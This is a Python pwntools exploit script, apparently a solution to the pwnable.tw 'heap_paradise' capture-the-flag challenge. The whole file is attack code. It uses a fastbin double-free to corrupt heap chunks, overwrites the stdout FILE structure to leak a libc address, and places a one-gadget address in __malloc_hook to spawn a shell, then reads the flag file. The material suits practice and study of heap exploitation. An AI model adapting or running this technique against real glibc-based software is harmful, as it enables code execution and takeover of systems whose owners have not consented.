from pwn import *
def cmd(c):
	p.sendlineafter("ice:",str(c))
def add(size,data='A'):
	cmd(1)
	p.sendlineafter("Size :",str(size))
	p.sendafter("Data :",data)
def free(idx):
	cmd(2)	
	p.sendlineafter("Index :",str(idx))
p=process("./heap_paradise",env={"LD_PRELOAD":'./libc'})
#p=remote("chall.pwnable.tw",10308)
#context.log_level='debug'
add(0x68,p64(0x71)*12)#0
add(0x68,p64(0x71)*13)#1
add(0x68,p64(0x21)*13)#2
free(0)
free(1)
free(0)
add(0x68,'\x60')#3
add(0x68,'A')#4
add(0x68,'A')#5
add(0x68,p64(0xdeadbeef)+p64(0x91))#6

free(1)
add(0x68,'\xdd\x25')#7
free(0)
free(6)
free(0)
add(0x68,p64(0x71)*12+'\x70')#8
add(0x68,"A")#9
add(0x68,"A")#10
add(0x68,"\x00"*(0x43-0x10)+p64(0xfbad1800)+p64(0)*3+"\x00")#11

p.read(0x40)
base=u64(p.read(8))-(0x7ffff7dd2600-0x00007ffff7a0d000)+0x1000
free(0)
free(6)
free(0)
libc=ELF('./libc')
libc.address=base
add(0x68,p64(0x71)*12+p64(libc.symbols['__malloc_hook']-35))#12
add(0x68,"A")#13
add(0x68,"\x00"*19+p64(base+0xef6c4))
log.warning(hex(base))
cmd(1)
#p.sendline("0")
p.sendline("cat /home/heap_paradise/flag")
#gdb.attach(p,'x/8gx 0x000000000202040+0x0000555555554000')
p.interactive()
